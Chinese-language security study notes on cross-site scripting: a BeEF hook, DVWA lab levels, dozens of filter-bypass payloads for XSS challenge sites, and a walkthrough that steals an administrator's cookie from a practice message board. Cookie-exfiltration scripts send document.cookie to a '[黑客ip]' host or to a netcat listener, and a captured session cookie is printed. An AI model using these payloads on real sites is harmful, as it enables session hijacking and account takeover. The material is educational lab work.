# XSS（XSS原理、beef-xss攻击平台、DVWA靶场、XSS分类、 盗取客户端cookie实战、利用nc（不能用外网也不能用kali）盗取cookie、xss弹窗方式、XSS靶场-绕过过滤、XSS挑战、XSS实战）

# XSS介绍

## 基本知识

跨站攻击

前端发生的攻击

JavaScript

安全人员测试xss：

如果测试成功，就是让它弹窗

```
<script>alert('1')</script>
```

在前端的世界里，html css js如果被正确执行，就无法在前端被人看到。

xss攻击的目的就是要让前端把我们的攻击代码执行！！



kali使用beef，beef=xss攻击平台

```
cd /usr/share/beef-xss
./beef
```

在得到的一大串东西里：

```
# ui/panel 是操作窗口的路径

# hook.js是测试xss漏洞成功之后的攻击代码：
<script src="http://[黑客ip]:3000/hook.js"></script>
```

![image-20220115232800286](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20220115232800286.png)

![image-20220115232824152](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20220115232824152.png)

**但凡出现互动的地方，都可能出现漏洞！！！！！**





## dvwa靶场

admin

password



### XSS(Reflected)——反射性XSS

![image-20220115223613971](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20220115223613971.png)



#### Low

```
<pre>Hello <script>alert('1')</script></pre>
```

基本形式

**script标签是js语言执行用的，当js正确执行的时候，不会出现东西，js会被浏览器执行！！！！**



#### Medium

```
<scr<script>ipt>alert('1')</script>
```

过滤掉了`script`

尝试双写绕过



#### High

```
点住我！<img src="x" onmouseup=alert(1) />
```

![image-20220115223743209](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20220115223743209.png)

过滤掉了如上内容，可以尝试“无法加载图片”

```
<img src="xxx" onerror=alert("xss")>

点住我！<img src="x" onmouseover=alert(1) />
```



### XSS(Stored)——存储型XSS

![image-20220115224946930](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20220115224946930.png)



#### Low

```
<script>alert('1')</script>
```

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/70.png)

![image-20220115225904176](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20220115225904176.png)

>`trim(string,charlist)` ： 移除string字符两侧的预定义字符，预定义字符包括\t 、 \n 、\x0B 、\r以及空格，可选参数charlist支持添加额外需要删除的字符
>
>`stripslashes(string)`： 去除掉string字符的反斜杠＼
>
>`mysqli_real_escape_string(string,connection) `：函数会对字符串string中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。
>
>`$GLOBALS `：引用全局作用域中可用的全部变量。`$GLOBALS `这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为` $GLOBALS[index]` 的数组中存储了所有全局变量。变量的名字就是数组的键。
>
>可以看出，low级别的代码对我们输入的message和name并没有进行XSS过滤，而且数据存储在数据库中，存在比较明显的存储型XSS漏洞
>
>我们输入 1 和 `<script>alert('hack')</script>` ，可以看到，我们的js代码立即就执行了
>
>查看数据库，可以看到我们的js代表插入进去了。
>
>查看源代码，可以看到，Message位置显示的是我们的js代码，因为这里显示的数据是调用数据库里的数据。



#### Medium

抓包修改，编码绕过

![image-20220115225439298](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20220115225439298.png)

>`addslashes(string)` ：函数返回在预定义字符之前添加反斜杠的字符串，预定义字符 ' 、" 、\ 、NULL
>
>`strip_tags(string)` ：函数剥去string字符串中的 HTML、XML 以及 PHP 的标签
>
>`htmlspecialchars(string)`： 把预定义的字符 "<" （小于）、 ">" （大于）、& 、‘’、“” 转换为 HTML 实体，防止浏览器将其作为HTML元素

>再次输入1 和 `<script>alert('hack')</script>` ，strip_tags函数把`<script>`标签给剥除了，addslashes函数把` '` 转义成了` \'`

所以我们想到了抓包，然后进行篡改，我们输入如下的，然后抓包

如下框中的数据就是 `<script>al `经过URL编码后的数据

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/70.png)

我们需要将其修改为` <SCRIPT>alert('hack')</SCRIPT>` 经过URL编码后的数据:

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/70.png)

提交后，就可以看到弹出此框了，说明我们的js代码执行了

查看数据库，可以看到我们的代码插入进数据库了。

查看页面源代码，可以看到name位置插入了我们的js代码



#### High

抓包修改，绕过正则表达式过滤，编码绕过

![image-20220115225806161](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20220115225806161.png)

>可以看到，high级别只是在medium级别上，name参数用了`正则表达式:/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i`进行过滤而已，我们仍然可以在name参数做手脚，抓包，然后改包，只不过这次改成` <img src=1 οnerrοr=alert('hack')>`

我们输入如下的:

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/70.png)

然后将 `<img src=1 οnerrοr=alert('hack')> `进行URL编码

![img](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/70.png)

可以看到，我们的js代码执行了

查看数据库，我们的代码被插入进数据库了

查看源代码，可以看到name位置插入了我们的img标签





## XSS分类

### 存储型xss

存储型xss是将用户提交的xss代码保存到数据库上，当有人访问页面的时候，服务器把数据库里面的xss代码查询出来，插入网页中交给用户，而用户的浏览器会执行其中的代码

![image-20210920102615757](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920102615757.png)

![image-20210920080240846](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920080240846.png)

存储型xss是持久存储的，每次访问都会被触发

### DOM型xss

DOM树

![image-20210920102723527](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920102723527.png)

通过JavaScript，可以重构HTML文档，比如我们可以让图片在加载错误的时候，执行我们指定的js脚本，相当于图片的标签就是js的标签

在留言板中提交如下内容，意思是当图片xxx无法加载的时候，就执行后面的代码

```html
<img src="xxx" onerror=alert("xss")>
```

可以看到图片裂开了，然后就触发了js代码

![image-20210920081815795](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920081815795.png)

### 反射型xss

反射型XSS效果与存储型XSS和DOM型XSS差不多，唯一的差别是反射型XSS直接把GET中的参数显示在网页上，没有经过数据库，而存储型XSS是先存储到服务器上，再回显到网页的。

![image-20210920102359527](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920102359527.png)

反射型xss需要构造链接，并且让被攻击者自己点击链接，所以需要与社会工程学配合才可以达到最好效果

（如果是链接里的是偷取cookie的代码，那就被偷取了）

（可以通过短网址的方式隐藏链接里的明显代码）

【可以查看CTF-初识XSS了解例子】



## 盗取客户端cookie实战

进入靶场里一个留言板的网站

### XSS平台准备（接收cookie的地方）

xss平台可以自己搭建，也可以使用别人搭建好的，甚至js学习的不错的，可以不需要xss平台，直接将xss得到的信息发到邮箱

本次案例使用的是xss平台（注册等尽量不要留下真实信息）

- 在xss平台上创建项目

![image-20210920122533094](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920122533094.png)

- 选择需要的功能模块

![image-20210920122624961](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920122624961.png)

- 获取xss脚本

![image-20210920122714706](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920122714706.png)

```html
<script src=http://xss.iproute.cn/0Esg1g?1632111988></script>
```

### 插入xss代码

在留言板中进行留言，留言的内容中必须包含xss脚本

![image-20210920123404046](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920123404046.png)

提交成功之后，我们就可以在留言板界面看到这条留言，可以发现我们夹带在其中的代码已经被执行了

![image-20210920123532138](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920123532138.png)

在xss平台上，我们也可以看到这个游客身份的cookie已经被获取

![image-20210920123646434](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920123646434.png)

下面等待管理员上线

### 模拟管理员上线

这个网站的后台是

```
https://d20.s.iproute.cn/index.php?c=adminlogin
```

![image-20210920123748633](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920123748633.png)

登录成功后，我们查看到这条留言

![image-20210920123813693](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920123813693.png)

此时管理员的cookie已经被提交到xss平台上面，我们已经获取到管理员的cookie以及后台的地址

![image-20210920123919479](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920123919479.png)

### 盗用管理员cookie登录后台

这边使用cookie修改器，强行修改cookie的内容，然后登录后台（hackbar也可以修改cookie：用POST提交后把HEAD改为cookie，即可进行修改）

![image-20210920124038048](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920124038048.png)

修改cookie之后，直接发起访问

![image-20210920124116024](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920124116024.png)

哪怕直接修改管理员密码都是可以的

![image-20210920124143089](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/01%20XSS%E4%BB%8B%E7%BB%8D.assets/image-20210920124143089.png)





### 如果某天不能用外网，也不能用kali：

以DVWA的存储型XSS为例

使用nc监听4444端口：

【windows在nc存在的目录下打开命令行】

```
nc -lvp 4444
```

```
具体nc的使用方法查看：渗透测试微专业学习04.md
```



方法一：创建img标签写入文件+nc

```
<script>var img = document.createElement("img");img.src="http://127.0.0.1:4444/a?"+escape(document.cookie);</script>

<script>var img = document.createElement("img");img.src="http://[黑客ip]/a?"+escape(document.cookie);</script>
```



方法二：直接写入文件+nc

```
<script>
document.write('<img src="http://[黑客ip]/?'+document.cookie+'"/> ');
</script>
```



原理：前端页面上写入一个img标签即表示图片，图片连接了黑客的4444端口，然后访问前端的用户会自动通过`?`传参传入用户的cookie值，并使用http协议发送给nc

```
document.cookie
获取用户所在网站的cookie
```

用户访问后，可以在nc上看到：

```
BEEFHOOK=AREs541oCaZqmaEhmEu8FKmaX7baBAFUMp2ZapHkFhcDuYwsDfAhSSCcBQYdTN3mCMUrBdZdG7dgWZ0H;%20PHPSESSID=pp6ei8ut8gkmntp2t4dv7vo026;%20security=low
```



啊d注入工具——cookie的测试工具



```
如果某天不能用外网，也不能用kali

存储型xss最重要的是获取用户的cookie！！！！！！！！！！

nc -lvp 4444 使用nc监听4444端口

<script>var img = document.createElement("img");img.src="http://127.0.0.1:4444/a?"+escape(document.cookie);</script>

<script>
document.write('<img src="http://127.0.0.1:4444/?'+document.cookie+'"/> ');
</script>

document.cookie
获取用户所在网站的cookie

用户访问后，可以在nc上看到
BEEFHOOK=AREs541oCaZqmaEhmEu8FKmaX7baBAFUMp2ZapHkFhcDuYwsDfAhSSCcBQYdTN3mCMUrBdZdG7dgWZ0H;%20PHPSESSID=pp6ei8ut8gkmntp2t4dv7vo026;%20security=low
```



## 还有可能的弹窗方式

```
<script/haha>
  alert(1)
</script>

<script
>
  alert(1)
</script>

<scr\x00ipt>
  alert(1)
</scr\x00ipt>

<i[%00]mg onerror="alert(1)" src="" />

<img/onerror=alert(1) src="" />
```




# xss靶场

xss1.njhack.xyz



## 0x00——基本形式

```
<script>alert(1)</script>
```

![image-20220115230436139](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220115230436139.png)

```
[html]
<div><script>alert(1)</script></div>

[server code]
function render (input) {
return '<div>' + input + '</div>'
}

http://xss.test/?input=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```



## 0x01——提前闭合`/>`

```
</textarea><script>alert(1)</script><textarea>
```

![image-20220115230657881](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220115230657881.png)

```
[html]
<extarea></textarea><script>alert(1)</script><textarea></textarea>

[server code]
function render (input) {
  return '<textarea>' + input + '</textarea>'
}
```



## 0x02——提前闭合`">`

```
"><script>alert(1)</script><"
```

```
<input type="name" value="fdfdfdfd "><script>alert(1)</script><img      ">
```

![image-20220115231023570](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220115231023570.png)

```
[html]
<input type="name" value=""><script>alert(1)</script><"">

[server code]
function render (input) {
  return '<input type="name" value="' + input + '">'
}
```



## 0x03——用反引号代替括号

```
<script>alert`1`</script>
```

![image-20220115231156578](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220115231156578.png)

```
function render ("haha") {
const stripBracketsRe = /[()]/g  input = "haha".replace(stripBracketsRe, '')
return input
}
```

屏蔽括号，考虑使用

```
`反引号
```

```
`<script>alert`1`</script>
```



```
[html]
<script>alert`1`</script>

[server code]
function render (input) {
  const stripBracketsRe = /[()]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```



## 0x04——实体编码字符`<svg>`代替括号和反引号

屏蔽

```
()`
```

考虑用：

```
0x04
```



或者：实体编码字符`<svg>`

svg标签会翻译后面的unicode字符

```
<svg><script>alert&#40;1&#41;</script>
```

![image-20220115232228712](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220115232228712.png)

```
[html]
svg><script>alert&#40;1&#41</script>

[server code]
function render (input) {
  const stripBracketsRe = /[()`]/g
  input = input.replace(stripBracketsRe, '')
  return input
}
```





## 0x05——闭合前端注释符`--!>`

以下两个方法都可以当前端的注释符
`<!-- --> `
`<!-- --!>`

```
--!><script>alert(1)</script>
```

![image-20220115232322884](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220115232322884.png)

```
[html]
<!-- --!><script>alert(1)</script> -->

[server code]
function render (input) {
  input = input.replace(/-->/g, '😂')
  return '<!-- ' + input + ' -->'
}
```



## 0x06——用`换行`和`onmouseover`绕过等号、on、右括号、包裹标签的过滤

```
onmouseover
="alert(1)"
```

js中语法松散：另起一行也可以用

![image-20220116100239216](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116100239216.png)

```
[html]
input value=1 onmouseover
=alert(1) type="text">

[server code]
function render (input) {
  input = input.replace(/auto|on.*=|>/ig, '_')
  return `<input value=1 ${input} type="text">`
}

#auto或者on开头，后面跟任何东西，直到出现=或者>，如果匹配，整条线都化为_
```



## 0x07——利用js中语法松散的图片加载失败`<img src=""onerror=""`绕过右标签的过滤

所有标签类只让写左标签，右标签一写上去就没了

```
<img src="x"onerror="alert(1)"
```

利用js中语法松散，此处不加右标签也可以执行

![image-20220116103302205](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116103302205.png)

```
[html]
<article><img src="x"onerror="alert(1)"</article>

[server code]
function render (input) {
  const stripTagsRe = /<\/?[^>]+>/gi

  input = input.replace(stripTagsRe, '')
  return `<article>${input}</article>`
}

```



## 0x08——利用`换行`对style标签过滤

style标签里是CSS规则，里面不能执行js代码

```
</style
><script>alert(1)</script>
```

利用js中语法松散

![image-20220116103446162](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116103446162.png)

```
[html]
<style>
      </style
><script>alert(1)</script>
    </style>

[server code]
function render (src) {
  src = src.replace(/<\/style>/ig, '/* \u574F\u4EBA */')
  return `
    <style>
      ${src}
    </style>
  `
}
```



## 0x09——利用`闭合`绕过输入网站才能用script标签的过滤

提前闭合或者换行

```
域名“></script><img scr=""onerror="alert(1)

http://www.segmentfault.com" 
onload="alert(1)

http://www.segmentfault.com"></script><img src="x" onerror="alert(1)
```

![image-20220116103956856](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116103956856.png)



```
[html]
<script src="http://www.segmentfault.com"></script><img src="x" onerror="alert(1)"></script>

[server code]
function render (input) {
  let domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${input}"></script>`
  }
  return 'Invalid URL'
}
```



## 0x0A——利用`@`绕过关于网址部分元素替换的过滤

```
域名@网站2[放在公网上的js文件]

http://www.segmentfault.com@http://sqlilabs.njhack.xyz/A.js
```

利用放在公网上的js文件——可以被替换成kali上做的hook.js

加上了@之后，也会同时加载后面的网站

![image-20220116114921835](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116114921835.png)

```
[html]
script src="http:&#x2f&#x2fwww.segmentfault.com@http:&#x2f&#x2fsqlilabs.njhack.xyz&#x2fA.js"></script>

[server code]
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f')
  }

  const domainRe = /^https?:\/\/www\.segmentfault\.com/
  if (domainRe.test(input)) {
    return `<script src="${escapeHtml(input)}"></script>`
  }
  return 'Invalid URL'
}
```





## 0x0B——利用域名的某文件【js文件】绕过自动把输入内容转为大写的过滤

```
<script src="http://...//A.js"></script>

<script src="http://sqlilabs.njhack.xyz/A.JS"></script>
```

js标签，src地址随便

但是js语法是大小写敏感的。

——但是浏览器【域名的加载】的大小写也无所谓。

![image-20220116115030681](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116115030681.pngg)

```
[html]
<h1><SCRIPT SRC="HTTP://SQLILABS.NJHACK.XYZ/A.JS"></SCRIPT></h1>

[server code]
function render (input) {
  input = input.toUpperCase()
  return `<h1>${input}</h1>`
}

```



## 0x0C——双写绕过script标签大写的过滤

```
<scrscriptipt src="http://sqlilabs.njhack.xyz/A.JS"></scrscriptipt>
```

![image-20220116115053113](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116115053113.png)

```
[html]
<h1><SCRIPT SRC="HTTP://SQLILABS.NJHACK.XYZ/A.JS"></SCRIPT></h1>

[server code]
function render (input) {
  input = input.replace(/script/ig, '')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}

```





## 0x0D——换行绕过并注释掉尾巴-替换`/'"`并注释输入内容的过滤

```
xx
alert(1)
-->
```

![image-20220116115124464](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116115124464.png)

```
[html]
script>
          // alert('xx
alert(1)
-->')
    </script>

[server code]
function render (input) {
  input = input.replace(/[</"']/g, '')
  return `
    <script>
          // alert('${input}')
    </script>
  `
}
过滤< " ' /
```



## 0x0E——古英语长s绕过字母大写且前加下划线的过滤

ſ

```
<ſcript src="http://sqlilabs.njhack.xyz/A.JS"></script>
```

![image-20220116115157020](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116115157020.png)

```
[html]
<h1><SCRIPT SRC="HTTP://SQLILABS.NJHACK.XYZ/A.JS"></SCRIPT></h1>

[server code]
function render (input) {
  input = input.replace(/<([a-zA-Z])/g, '<_$1')
  input = input.toUpperCase()
  return '<h1>' + input + '</h1>'
}
```





## 0x0F——提前闭合绕过console、特殊字符过滤

```
');alert(1)//
```

因为console语法里允许使用已转化的一些关键字符

![image-20220116115217303](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116115217303.png)

```
[html]
<img src onerror="console.error('&#39;);alert(1)&#x2f;&#x2f;')">

[server code]
function render (input) {
  function escapeHtml(s) {
    return s.replace(/&/g, '&amp;')
            .replace(/'/g, '&#39;')
            .replace(/"/g, '&quot;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/\//g, '&#x2f;')
  }
  return `<img src onerror="console.error('${escapeHtml(input)}')">`
}
```





## 0x10——分号提前结束赋值语句或换行绕过变量赋值的绕过

```
2
alert(1)

2;alert(1)
```

![image-20220116115256691](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116115256691.png)

```
[html]
<script>
  window.data = 2;alert(1)
</script>

script>
  window.data = 2
alert(1)
</script>

[server code]
function render (input) {
  return `
<script>
  window.data = ${input}
</script>
  `
}
```





## 0x11——分号提前结束赋值语句绕过log、【转义//】过滤

```
");alert(1);//
```

![image-20220116115341167](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116115341167.png)

```
[html]
<script>
  var url = 'javascript:console.log("\");alert(1);\/\/")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>

[server code]
// from alf.nu
function render (s) {
  function escapeJs (s) {
    return String(s)
            .replace(/\\/g, '\\\\')
            .replace(/'/g, '\\\'')
            .replace(/"/g, '\\"')
            .replace(/`/g, '\\`')
            .replace(/</g, '\\74')
            .replace(/>/g, '\\76')
            .replace(/\//g, '\\/')
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            .replace(/\t/g, '\\t')
            .replace(/\f/g, '\\f')
            .replace(/\v/g, '\\v')
            // .replace(/\b/g, '\\b')
            .replace(/\0/g, '\\0')
  }
  s = escapeJs(s)
  return `
<script>
  var url = 'javascript:console.log("${s}")'
  var a = document.createElement('a')
  a.href = url
  document.body.appendChild(a)
  a.click()
</script>
`
}
```



## 0x12——\转义且分号提前结束赋值语句绕过

```
\");alert(1);//
```

![image-20220116115418298](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/02%20XSS%E9%9D%B6%E5%9C%BA.assets/image-20220116115418298.png)

```
[html]
<script>console.log("\\");alert(1);//");</script>

[server code]
// from alf.nu
function escape (s) {
  s = s.replace(/"/g, '\\"')
  return '<script>console.log("' + s + '");</script>'
}
```




# XSS挑战

https://xssaq.com/yx/index.php

但凡和用户互动的地方可能出现漏洞

## level1

![image-20220116110313980](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116110313980.png)

```
?name=<script>alert(1)</script>
```



## level2

![image-20220116110433010](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116110433010.png)

发现源代码里有替换：

![image-20220116110501088](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116110501088.png)

![image-20220116110719360](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116110719360.png)

此处可以互动且可用：

```
<input name=keyword  value="<script>alert(1)</script>">

所以改：
"><script>alert(1)</script>
```



## level3

![image-20220116110809127](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116110809127.png)

标准流程：

```
<script>alert(1)</script>
```

查看源代码

![image-20220116110850591](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116110850591-16423025314891.png)

发现源代码input标签里也有转化：

那么可以考虑`onclick——点击搜索`：

![image-20220116110951521](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116110951521.png)

```
' onclick='alert(1)
```



## level4

![image-20220116111058587](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116111058587.png)

源代码：

![image-20220116111126255](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116111126255.png)

基本操作后发现左右括号被替换，双引号闭合。

类似level3

```
" onclick="alert(1)
```



## level5

查看源码发现

![image-20220116130128748](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116130128748.png)

value把输入的内容闭合了。

那么基础语句：

```
"><script>alert(1)</script>
```

![image-20220116130256919](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116130256919.png)

发现标签被破坏

那么可以使用：

使用a标签，点击触发

```
"><a href=javascript:alert(1)><"
```

![image-20220116130351368](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116130351368.png)



## level6

![image-20220116130431598](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116130431598.png)

![image-20220116130440975](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116130440975.png)

尝试转换大小写：

类似level5

```
"><a HREF=javascript:alert(1)><"
```



## level7

![image-20220116130515773](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116130515773.png)

![image-20220116130544226](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116130544226.png)

发现script被吃掉

可闭合双写绕过：

```
"><scrscriptipt>alert(1)</scrscriptipt><"
```



## level8

![image-20220116130612742](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116130612742.png)

查看源码

![image-20220116130724499](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116130724499.png)

会有两处与用户交互

```
<script>alert(1)</script>
```

![image-20220116130836442](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116130836442.png)

并且左右标签括号被转换。

可以考虑——

unicode编码a标签里的href：

unicode编码在前端会进行解析为正常的字符

href="里面的任何字符串都会被当做协议来执行"

```
javascript:alert(1)

&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```



## level9

![image-20220116131059999](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116131059999.png)

![image-20220116131117414](https://github.com/YTR1020/Trees/blob/main/Screenshot%20or%20pictures/HW/Attack/03%20XSS%E6%8C%91%E6%88%98.assets/image-20220116131117414.png)

会判断合法与否

